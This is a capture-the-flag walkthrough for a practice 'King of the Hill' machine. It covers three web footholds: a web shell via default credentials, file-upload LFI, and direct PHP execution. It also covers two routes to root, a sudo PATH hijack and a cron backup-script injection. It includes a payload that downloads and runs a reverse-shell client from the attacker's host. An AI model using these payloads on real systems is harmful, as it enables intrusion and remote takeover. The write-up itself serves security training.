# H1: Easy KOTH machine

Has a website on 8000, 8001, 8002 and 80.

Path to foothold:

- :8000 at /vbcms has a login form that can be passed with admin:admin. you can then edit the content of the home and about pages etc, injecting a web shell. this gets code execution as `serv1`
- :8001 has a support page that allows you to upload any file as long as its extension is .jpg. then the home page has a trivial file include, which allows you to achieve PHP LFI with your uploaded file. this will get you code execution as `serv2`
- :8002 has a PHP tutorial site, allowing direct execution of whatever PHP you supply (just remember to end lines with a semi colon). this gets you code execution as `serv3`
  - there is no nc on the machine. using reverse_ssh, a payload like `system("wget RHOST:1234/client -O /home/serv3/c && chmod +x /home/serv3/c && /home/serv3/c");` works
  - curl command: 
  
    ```
    curl -d "code=system(%22wget+10.10.10.157%3A1234%2Fclient+-O+%2Fhome%2Fserv3%2Fc+%26%26+chmod+%2Bx+%2Fhome%2Fserv3%2Fc+%26%26+%2Fhome%2Fserv3%2Fc%22)%3B" 10.10.136.24:8002/trycode
    ```

Path to root:

- `serv2` can under sudoers run a script (`serv2 ALL=(ALL:ALL) SETENV:NOPASSWD: /usr/bin/restartServer`) that eventually calls systemctl, and preserves env vars. by creating a file called `systemctl` in /tmp, putting /bin/sh inside it, marking it executable and then setting path to include tmp you can privect to root:

  `echo /bin/sh > /tmp/systemctl && chmod +x /tmp/systemctl && sudo PATH=/tmp:$PATH /usr/bin/restartServer`
  
- `serv3` has a backup.sh script under backups in their home folder that root will run every minute. simply popping a rev shell payload in there will get root.
  - this method has the advantage that it will get called continuosly and might be missed by king squatters
  - note the file needs to be made writable first, `chmod +w /home/serv3/backups/backup.sh`, and if using a binary like reverse_ssh, put it in serv3's home folder not temp.

    ```
    chmod +w /home/serv3/backups/backup.sh
    echo /home/serv3/c >> /home/serv3/backups/backup.sh
    rm /home/serv3/c # after connection is made
    ```

## Flags

- /root/root.txt
- /var/www/serv4/index.php
- /var/lib/rary
